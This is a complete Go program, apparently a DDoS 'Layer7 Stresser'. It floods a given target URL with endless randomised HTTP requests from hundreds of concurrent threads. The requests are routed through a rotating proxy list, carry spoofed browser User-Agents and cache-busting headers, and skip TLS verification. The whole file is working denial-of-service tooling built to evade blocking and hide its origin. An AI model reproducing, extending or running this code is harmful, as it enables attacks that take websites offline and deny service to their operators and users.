package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	target     string
	proxies    []string
	methods    = []string{"GET", "POST", "HEAD", "PUT"}
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
	}
)

func loadProxies(file string) {
	f, err := os.Open(file)
	if err != nil {
		fmt.Println("[-] Cannot open proxy list:", err)
		os.Exit(1)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
}

func getRandomProxy() string {
	if len(proxies) == 0 {
		return ""
	}
	return proxies[rand.Intn(len(proxies))]
}

func getRandomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func attack(wg *sync.WaitGroup, id int) {
	defer wg.Done()

	for {
		proxyStr := getRandomProxy()
		if proxyStr == "" {
			time.Sleep(50 * time.Millisecond)
			continue
		}

		proxyURL, _ := url.Parse("http://" + proxyStr)

		client := &http.Client{
			Transport: &http.Transport{
				Proxy:           http.ProxyURL(proxyURL),
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			Timeout: 12 * time.Second,
		}

		method := methods[rand.Intn(len(methods))]
		req, _ := http.NewRequest(method, target, nil)

		req.Header.Set("User-Agent", getRandomUA())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Pragma", "no-cache")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Referer", target)

		resp, err := client.Do(req)
		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
		// silent fail - proxies die anyway

		time.Sleep(time.Duration(rand.Intn(30)) * time.Millisecond)
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: ./stresser <target_url> <proxylist.txt> <threads>")
		fmt.Println("Example: ./stresser https://target.com proxies.txt 1200")
		os.Exit(1)
	}

	target = os.Args[1]
	proxyFile := os.Args[2]
	threads := 500
	fmt.Sscanf(os.Args[3], "%d", &threads)

	rand.Seed(time.Now().UnixNano())

	loadProxies(proxyFile)

	fmt.Printf("[+] Layer7 Stresser Started → %s | Threads: %d | Proxies: %d\n", target, threads, len(proxies))

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(&wg, i)
	}

	wg.Wait() // runs forever
}
